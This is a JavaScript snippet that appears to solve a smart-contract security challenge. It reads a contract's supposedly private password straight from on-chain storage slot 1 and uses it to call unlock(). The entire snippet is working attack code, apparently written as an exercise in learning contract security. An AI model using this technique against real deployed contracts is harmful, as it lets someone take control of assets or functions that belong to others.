const crack = async () => {
    // Password is the second assigment of instance
    // It is therefore stored in the second memory slot of that contract [<bool public locked>, <bytes32 private password>]
    const passwordHex = await web3.eth.getStorageAt(instance, 1);
    
    const crackedPassword = web3.utils.hexToUtf8(passwordHex);
    
    const vaultContract = await new web3.eth.Contract(contract.abi, instance);
    
    const lockedStatusBefore = await vaultContract.methods.locked().call({ from: player });
    const tx = await vaultContract.methods.unlock(passwordHex).send({ from: player });
    const lockedStatusAfter = await vaultContract.methods.locked().call({ from: player });
    
    return {
        crackedPassword: crackedPassword,
        lockedStatusBefore: lockedStatusBefore,
        lockedStatusAfter: lockedStatusAfter,
        tx: tx,
    };
}